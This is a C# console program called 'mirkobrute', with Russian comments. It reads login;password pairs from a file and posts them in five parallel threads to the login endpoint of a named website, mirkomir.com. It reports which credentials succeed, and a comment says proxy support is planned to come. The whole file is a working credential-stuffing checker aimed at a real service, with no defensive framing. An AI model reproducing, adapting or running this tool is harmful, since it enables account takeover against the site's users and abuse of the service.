using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Collections.Specialized;
using System.IO;

namespace mirkobrute
{
    class Program
    {
        private const int MaxThread = 5;
        private static Queue<string> proxyes; // в следующих версиях ожидаются прокси
        private static readonly Object sync = new object();
        private static int i = 0; // хрень для информирования при завершении задания
        private static int r = 1;
        private static string login;

        private static readonly AutoResetEvent reset = new AutoResetEvent(false);
        private static readonly List<Thread> threads = new List<Thread>();
        static void Main(string[] args)
        {
            if (File.Exists("accounts.txt"))
            {
                string[] accounts = File.ReadAllLines("accounts.txt");

                foreach (string account in accounts)
                {
                    if (!((string)account).Contains('#'))
                    {


                        i++;
                        Thread worker = new Thread(Brute);
                        worker.Start(account);
                        threads.Add(worker);
                        if (threads.Count >= MaxThread) reset.WaitOne();
                    }
                } 
                Console.ReadKey(true);
                Console.Read();
            }
            else
            {
                Console.WriteLine("база аккаунтов не найдена");
                Console.ReadLine();
            }
        }
        static void Brute(object accounts)
        {
            string login = ((string)accounts).Split(';')[0];
            string pass = ((string)accounts).Split(';')[1];
            string url = "https://mirkomir.com/script/login";

            using (var webClient = new WebClient())
            {
                var pars = new NameValueCollection();
                pars.Add("login", login);
                pars.Add("password", pass);
                pars.Add("remember", "true");
                var response = webClient.UploadValues(url, pars);
                var otvet = Encoding.UTF8.GetString(response);
                string status = (otvet).Split('"')[0];
                string status2 = (otvet).Split('"')[1];
                switch (status2)
                {
                    case "success":
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("S: L: {0}| P: {1}| R: {2}", login, pass, r);
                        Console.ForegroundColor = ConsoleColor.White;
                        r++;
                        break;
                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("F: R: {0}| L: {1}", r, login);
                        Console.ForegroundColor = ConsoleColor.White;
                        r++;
                        break;
                }
            }
            lock (sync) threads.Remove(Thread.CurrentThread);
            reset.Set();
        }
       
    }
}
